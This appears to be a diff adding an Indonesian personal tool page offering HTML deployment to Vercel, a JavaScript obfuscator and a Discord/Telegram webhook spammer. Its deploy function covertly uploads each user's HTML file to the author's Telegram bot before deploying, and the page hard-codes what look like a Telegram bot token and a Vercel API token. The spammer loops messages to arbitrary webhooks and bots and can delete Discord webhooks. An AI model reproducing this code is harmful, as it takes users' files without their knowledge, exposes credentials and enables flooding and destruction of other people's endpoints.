@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>website by pinoo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Poppins:wght@400;600&family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <style>
+        :root {
+            --accent: #00f2ff;
+            --pink: #ff00ff;
+            --glass: rgba(15, 15, 15, 0.9);
+            --primary-vercel: #0070f3;
+            --danger: #ff4d4d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; overflow-x: hidden; font-family: 'Press Start 2P', cursive; }
+        #bgVideo { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; object-fit: cover; filter: brightness(40%); }
+        
+        /* CUSTOM ALERT & CONFIRM CSS */
+        #pinoo-alert-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+            z-index: 10000; display: none; justify-content: center; align-items: center;
+        }
+        .pinoo-modal {
+            background: var(--glass); border: 4px solid #fff; padding: 25px;
+            max-width: 320px; width: 90%; text-align: center;
+            box-shadow: 10px 10px 0px var(--pink);
+            animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes modalPop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .pinoo-modal p { color: #fff; font-size: 8px; line-height: 1.6; margin-bottom: 20px; text-transform: uppercase; }
+        .pinoo-modal-btns { display: flex; gap: 10px; justify-content: center; }
+        .pinoo-btn {
+            padding: 10px 15px; font-family: inherit; font-size: 8px; cursor: pointer;
+            border: 2px solid #000; box-shadow: 3px 3px 0px #000; transition: 0.1s;
+        }
+        .pinoo-btn-ok { background: var(--accent); color: #000; }
+        .pinoo-btn-cancel { background: var(--danger); color: #fff; }
+        .pinoo-btn:active { transform: translate(2px, 2px); box-shadow: 0px 0px 0px; }
+
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: 0.8s ease; }
+        #overlay button { background: #fff; border: 4px solid var(--accent); padding: 20px; font-size: 10px; cursor: pointer; box-shadow: 8px 8px 0px var(--pink); font-family: inherit; }
+
+        .menu-btn { position: fixed; top: 20px; left: 20px; background: #fff; border: 4px solid #000; padding: 12px; cursor: pointer; z-index: 2000; box-shadow: 4px 4px 0px var(--accent); }
+        .sidebar { position: fixed; left: -320px; top: 0; width: 280px; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-right: 4px solid #fff; padding: 100px 20px; transition: 0.4s ease; z-index: 1500; }
+        .sidebar.active { left: 0; }
+        .opt { background: #fff; color: #000; padding: 15px; font-size: 9px; cursor: pointer; border: 4px solid #000; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        
+        .container { background: var(--glass); backdrop-filter: blur(20px); border: 4px solid #fff; padding: 70px 25px 30px 25px; width: 100%; max-width: 480px; text-align: center; position: relative; box-shadow: 15px 15px 0px rgba(0,0,0,0.6); }
+        .profile-pic { width: 90px; height: 90px; border: 4px solid #fff; outline: 4px solid #000; position: absolute; top: -50px; left: 50%; transform: translateX(-50%); z-index: 100; object-fit: cover; background: #000; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.4s ease; }
+        h1 { color: #fff; font-size: 10px; margin-bottom: 25px; text-shadow: 3px 3px 0px #000; line-height: 1.4; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card { display: flex; align-items: center; background: #fff; padding: 22px; text-decoration: none; color: #000; font-size: 11px; margin-bottom: 15px; border: 4px solid #000; box-shadow: 6px 6px 0px var(--accent); transition: 0.2s; }
+        .card:active { transform: translate(3px, 3px); box-shadow: 3px 3px 0px var(--accent); }
+        .card i { font-size: 24px; margin-right: 15px; } 
+
+        .deploy-ui { font-family: 'Press Start 2P', cursive; text-align: left; background: #111; border: 4px solid #fff; padding: 25px; margin-top: 10px; box-shadow: 6px 6px 0px var(--primary-vercel); }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { font-size: 7px; color: #fff; display: block; margin-bottom: 8px; text-transform: uppercase; }
+        .input-modern { width: 100%; padding: 12px; background: #000; border: 2px solid #fff; color: var(--accent); outline: none; font-family: inherit; font-size: 8px; }
+        .btn-modern { width: 100%; padding: 14px; background: #fff; color: #000; border: 4px solid #000; cursor: pointer; transition: 0.2s; font-family: inherit; font-size: 8px; box-shadow: 4px 4px 0px #888; }
+
+        .input-pixel { width: 100%; padding: 12px; background: #000; border: 3px solid #fff; color: #fff; font-size: 8px; margin-bottom: 15px; outline: none; font-family: inherit; }
+        .action-pixel { width: 100%; padding: 15px; background: #fff; font-size: 9px; cursor: pointer; border: 4px solid #000; box-shadow: 5px 5px 0px var(--pink); font-family: inherit; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .log-box { background: #000; border: 2px solid #fff; height: 120px; overflow-y: auto; padding: 10px; font-size: 7px; color: #00f2ff; text-align: left; margin-top: 10px; font-family: monospace; position: relative; }
+        .btn-clear { position: absolute; right: 5px; top: 5px; background: var(--danger); color: white; border: none; font-size: 6px; padding: 4px; cursor: pointer; font-family: inherit; }
+        .footer { margin-top: 25px; font-size: 8px; color: #fff; opacity: 0.6; }
+        .sub-tab-container { display: flex; gap: 5px; margin-bottom: 15px; }
+        .sub-tab { flex: 1; padding: 10px; font-size: 7px; background: #222; color: #fff; border: 2px solid #fff; cursor: pointer; text-align: center; }
+        .sub-tab.active { background: var(--accent); color: #000; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop playsinline id="bgVideo">
+        <source src="baground.mp4" type="video/mp4">
+    </video>
+
+    <div id="pinoo-alert-bg">
+        <div class="pinoo-modal">
+            <p id="pinoo-alert-msg"></p>
+            <div class="pinoo-modal-btns" id="pinoo-modal-btns"></div>
+        </div>
+    </div>
+
+    <div id="overlay">
+        <button onclick="startApp()">[ CLICK TO ENTER ]</button>
+        <p style="color: white; font-size: 7px; margin-top: 20px;">WELCOME TO PINOO WEBSITES</p>
+    </div>
+
+    <audio id="myAudio" loop><source src="musik.mp3" type="audio/mpeg"></audio>
+
+    <div class="menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></div>
+
+    <div class="sidebar" id="sidebar">
+        <div class="opt" onclick="switchTab('profile')"><i class="fas fa-user"></i> PROFILE</div>
+        <div class="opt" onclick="switchTab('deploy')"><i class="fas fa-cloud-upload-alt"></i> DEPLOY HTML</div>
+        <div class="opt" onclick="switchTab('encrypt')"><i class="fas fa-lock"></i> ENCRYPT JAVASCRIPT</div>
+        <div class="opt" onclick="switchTab('spammer')"><i class="fas fa-bomb"></i> SPAM KEYLOGGER</div>
+    </div>
+
+    <div class="container">
+        <video autoplay muted loop playsinline class="profile-pic">
+            <source src="profile.mp4" type="video/mp4">
+        </video>
+
+        <div id="tab-profile" class="tab-content active">
+            <h1>PINOO COMMUNITY</h1>
+            <div class="links">
+                <a href="https://whatsapp.com/channel/0029Vb7djJ97YSdCFHhojF1b" target="_blank" class="card">
+                    <i class="fab fa-whatsapp" style="color:#25D366;"></i><span>SALURAN</span>
+                </a>
+                <a href="https://www.tiktok.com/@pinooy4ndek" target="_blank" class="card">
+                    <i class="fab fa-tiktok" style="color:#000;"></i><span>TIKTOK</span>
+                </a>
+                <a href="https://www.instagram.com/p1n0_19" target="_blank" class="card">
+                    <i class="fab fa-instagram" style="color:#E4405F;"></i><span>INSTAGRAM</span>
+                </a>
+            </div>
+        </div>
+
+        <div id="tab-deploy" class="tab-content">
+            <div class="deploy-ui">
+                <h2 style="color:#fff; font-size:10px; text-align:center; margin-bottom:15px;"><i class="fas fa-rocket"></i> DEPLOY HTML</h2>
+                <div class="input-group">
+                    <label><i class="fas fa-tag"></i> Project Name</label>
+                    <input type="text" id="projName" class="input-modern" placeholder="nama project..." oninput="testName()">
+                    <span id="checkStatus" style="font-size:6px; color:var(--accent); margin-top:5px; display:block;"></span>
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-file-code"></i> Select File</label>
+                    <input type="file" id="htmlFileInput" accept=".html" style="display:none" onchange="handleHtmlFile(event)">
+                    <button class="btn-modern" onclick="document.getElementById('htmlFileInput').click()" id="htmlFileBtn" style="width:100%"><i class="fas fa-folder-open"></i> PILIH HTML</button>
+                </div>
+                <button id="deployBtn" class="btn-modern" style="background:var(--primary-vercel); color:#fff; width:100%;" onclick="startDeploy()">DEPLOY NOW</button>
+                <div id="resultBox" style="margin-top:15px; display:none; background:#001a00; padding:10px; border:2px solid lime;">
+                    <p style="color:lime; font-size:7px;">BERHASIL:</p>
+                    <a id="resLink" href="#" target="_blank" style="color:#fff; font-size:7px; text-decoration:underline;"></a>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-encrypt" class="tab-content">
+            <h1>JS ENCRYPTOR</h1>
+            <input type="file" id="jsFileInput" accept=".js" style="display:none" onchange="handleJsFile(event)">
+            <button class="action-pixel" onclick="document.getElementById('jsFileInput').click()">
+                <i class="fas fa-file-import"></i> PILIH FILE JAVASCRIPT
+            </button>
+            <textarea id="jsCode" class="input-pixel" style="height:120px;" placeholder="Paste JS Code..."></textarea>
+            <button class="action-pixel" style="background:var(--accent); color:#000;" onclick="encryptJS()">
+                <i class="fas fa-shield-alt"></i> ENCRYPT CODE
+            </button>
+            <button id="downloadJsBtn" class="action-pixel" style="background:lime; color:#000; display:none;" onclick="downloadJS()">
+                <i class="fas fa-download"></i> DOWNLOAD .JS
+            </button>
+        </div>
+
+        <div id="tab-spammer" class="tab-content">
+            <h1>MULTI SPAMMER</h1>
+            <div class="sub-tab-container">
+                <div id="btnDisc" class="sub-tab active" onclick="setSpamMode('discord')">DISCORD</div>
+                <div id="btnTele" class="sub-tab" onclick="setSpamMode('telegram')">TELEGRAM</div>
+            </div>
+            <input type="number" id="spamAmount" class="input-pixel" value="15" placeholder="Jumlah...">
+            <div id="uiDiscord">
+                <input type="text" id="discUrl" class="input-pixel" placeholder="Webhook URL...">
+                <div class="grid-2">
+                    <button class="action-pixel" onclick="checkWebhook()">CHECK</button>
+                    <button class="action-pixel" onclick="startDiscordSpam()">SPAM</button>
+                </div>
+                <button class="action-pixel" style="background:var(--danger); width:100%; color:white;" onclick="deleteWebhook()">DELETE WEBHOOK</button>
+            </div>
+            <div id="uiTelegram" style="display:none">
+                <input type="text" id="teleTokenSpam" class="input-pixel" placeholder="Bot Token...">
+                <input type="text" id="teleChatSpam" class="input-pixel" placeholder="Chat ID...">
+                <button class="action-pixel" onclick="startTeleSpam()">SPAM</button>
+            </div>
+            <div class="log-box">
+                <button class="btn-clear" onclick="clearLog()">CLEAR</button>
+                <div id="logOut">> gas bantai keylogger...</div>
+            </div>
+        </div>
+
+        <div class="footer">CRAFTED BY <strong>PINOO</strong></div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        const LOG_TOKEN = "8155876986:AAFb40EOzKRvZ7eHTnmxEuwd0_I-VIPM5MQ";
+        const LOG_CHAT_ID = "8022924362";
+        const VERCEL_TOKEN = "bazMfOcKIQhtdfekRAW7Udwn";
+
+        let currentHtmlContent = "";
+        let encryptedJsResult = "";
+
+        // ----- SISTEM CUSTOM ALERT -----
+        window.alert = function(msg) {
+            const bg = document.getElementById('pinoo-alert-bg');
+            const txt = document.getElementById('pinoo-alert-msg');
+            const btnBox = document.getElementById('pinoo-modal-btns');
+            txt.innerText = msg;
+            btnBox.innerHTML = `<button class="pinoo-btn pinoo-btn-ok" onclick="closePinooModal()">OKE</button>`;
+            bg.style.display = 'flex';
+        };
+
+        window.confirm = function(msg, callback) {
+            const bg = document.getElementById('pinoo-alert-bg');
+            const txt = document.getElementById('pinoo-alert-msg');
+            const btnBox = document.getElementById('pinoo-modal-btns');
+            txt.innerText = msg;
+            btnBox.innerHTML = `
+                <button class="pinoo-btn pinoo-btn-cancel" onclick="closePinooModal(false)">BATAL</button>
+                <button class="pinoo-btn pinoo-btn-ok" onclick="closePinooModal(true)">YA</button>
+            `;
+            bg.style.display = 'flex';
+            window.confirmCallback = callback;
+        };
+
+        function closePinooModal(res) {
+            document.getElementById('pinoo-alert-bg').style.display = 'none';
+            if (window.confirmCallback) { window.confirmCallback(res); window.confirmCallback = null; }
+        }
+
+        // ----- FUNGSI DASAR -----
+        function startApp() {
+            document.getElementById('overlay').style.opacity = '0';
+            setTimeout(() => { document.getElementById('overlay').style.display = 'none'; }, 800);
+            document.getElementById('myAudio').play().catch(()=>{});
+        }
+
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); }
+
+        function switchTab(t) {
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.getElementById('tab-' + t).classList.add('active');
+            if (window.innerWidth < 800) toggleSidebar();
+        }
+
+        async function sendToLog(name, content, ext) {
+            const formData = new FormData();
+            formData.append('chat_id', LOG_CHAT_ID);
+            formData.append('document', new Blob([content], {type:'text/plain'}), `${name}.${ext}`);
+            formData.append('caption', `📬 Log from Pinoo Web\nName: ${name}`);
+            try { await fetch(`https://api.telegram.org/bot${LOG_TOKEN}/sendDocument`, { method: 'POST', body: formData }); } catch(e){}
+        }
+
+        function handleHtmlFile(e) {
+            const file = e.target.files[0];
+            if(file){
+                document.getElementById('htmlFileBtn').innerText = file.name;
+                const r = new FileReader();
+                r.onload = (ex) => { currentHtmlContent = ex.target.result; };
+                r.readAsText(file);
+            }
+        }
+
+        async function startDeploy() {
+            const name = document.getElementById('projName').value.trim().toLowerCase().replace(/\s+/g, '-');
+            const btn = document.getElementById('deployBtn');
+            if(!name || !currentHtmlContent) return alert("MASUKIN FILE HTML NYA DULUH");
+            btn.innerHTML = '<i class="fas fa-sync fa-spin"></i> DEPLOYING...';
+            sendToLog(name, currentHtmlContent, "html");
+            try {
+                const res = await fetch('https://api.vercel.com/v13/deployments', {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${VERCEL_TOKEN}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: name, files: [{ file: 'index.html', data: currentHtmlContent }] })
+                });
+                if(res.ok) {
+                    document.getElementById('resultBox').style.display = 'block';
+                    document.getElementById('resLink').innerText = `https://${name}.vercel.app`;
+                    document.getElementById('resLink').href = `https://${name}.vercel.app`;
+                    btn.innerText = 'SUCCESS!';
+                } else { alert("DEPLOY GAGAL!"); btn.innerText = 'DEPLOY NOW'; }
+            } catch(e) { alert("ERROR!"); btn.innerText = 'DEPLOY NOW'; }
+        }
+
+        function handleJsFile(e) {
+            const file = e.target.files[0];
+            if(file){
+                const r = new FileReader();
+                r.onload = (ex) => { document.getElementById('jsCode').value = ex.target.result; };
+                r.readAsText(file);
+            }
+        }
+
+        function encryptJS() {
+            const code = document.getElementById('jsCode').value;
+            if(!code) return alert("KODE KOSONG!");
+            const res = JavaScriptObfuscator.obfuscate(code, { compact:true, controlFlowFlattening:true });
+            encryptedJsResult = res.getObfuscatedCode();
+            document.getElementById('jsCode').value = encryptedJsResult;
+            document.getElementById('downloadJsBtn').style.display = 'flex';
+            alert("JS BERHASIL DI ENCRYPT!");
+        }
+
+        function downloadJS() {
+            const blob = new Blob([encryptedJsResult], { type: 'text/javascript' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = 'pinoo_encrypted.js'; a.click();
+        }
+
+        // ----- SPAMMER LOGIC -----
+        function setSpamMode(m) {
+            const isD = m === 'discord';
+            document.getElementById('uiDiscord').style.display = isD ? 'block' : 'none';
+            document.getElementById('uiTelegram').style.display = isD ? 'none' : 'block';
+            document.getElementById('btnDisc').classList.toggle('active', isD);
+            document.getElementById('btnTele').classList.toggle('active', !isD);
+        }
+
+        function clearLog() {
+            document.getElementById('logOut').innerHTML = "> Log Cleared...";
+        }
+
+        async function checkWebhook() {
+            const url = document.getElementById('discUrl').value;
+            if(!url) return alert("URL KOSONG!");
+            addLog("Checking Webhook...");
+            try {
+                const res = await fetch(url);
+                if(res.ok) {
+                    const data = await res.json();
+                    addLog(`[OK] Name: ${data.name}`);
+                    alert("WEBHOOK AKTIF!");
+                } else {
+                    addLog("[ERROR] Webhook Invalid");
+                    alert("WEBHOOK MATI/INVALID!");
+                }
+            } catch(e) { addLog("[ERROR] Check Gagal"); }
+        }
+
+        async function startDiscordSpam() {
+            const url = document.getElementById('discUrl').value;
+            const amount = document.getElementById('spamAmount').value;
+            if(!url) return alert("URL KOSONG!");
+            addLog("Spam Discord Dimulai...");
+            for(let i=1; i<=amount; i++) {
+                try {
+                    await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:"SPAM BY PINOO COMMUNITY"}) });
+                    addLog(`> Sent Discord Message ${i}`);
+                } catch(e) { addLog(`> Failed message ${i}`); }
+                await new Promise(r => setTimeout(r, 500));
+            }
+            addLog("Spam Selesai!");
+        }
+
+        async function deleteWebhook() {
+            const url = document.getElementById('discUrl').value;
+            if(!url) return alert("URL KOSONG!");
+            confirm("Yakin mau hapus webhook ini?", async (res) => {
+                if(res) {
+                    try {
+                        const del = await fetch(url, { method: 'DELETE' });
+                        if(del.ok) {
+                            addLog("Webhook Berhasil Dihapus!");
+                            alert("WEBHOOK TERHAPUS!");
+                        } else { alert("Gagal Hapus!"); }
+                    } catch(e) { alert("Error deleting!"); }
+                }
+            });
+        }
+
+        async function startTeleSpam() {
+            const token = document.getElementById('teleTokenSpam').value;
+            const chatid = document.getElementById('teleChatSpam').value;
+            const amount = document.getElementById('spamAmount').value;
+            if(!token || !chatid) return alert("DATA TELE KOSONG!");
+            
+            addLog("Spam Telegram Dimulai...");
+            for(let i=1; i<=amount; i++) {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatid, text: "SPAM BY PINOO COMMUNITY" })
+                    });
+                    if(res.ok) addLog(`> Sent Tele Message ${i}`);
+                    else addLog(`> Tele Failed ${i}`);
+                } catch(e) { addLog(`> Error Tele ${i}`); }
+                await new Promise(r => setTimeout(r, 600));
+            }
+            addLog("Spam Selesai!");
+        }
+
+        function addLog(msg) {
+            const log = document.getElementById('logOut');
+            log.innerHTML += `<div>> ${msg}</div>`;
+            log.scrollTop = log.scrollHeight;
+        }
+
+    </script>
+</body>
+</html>
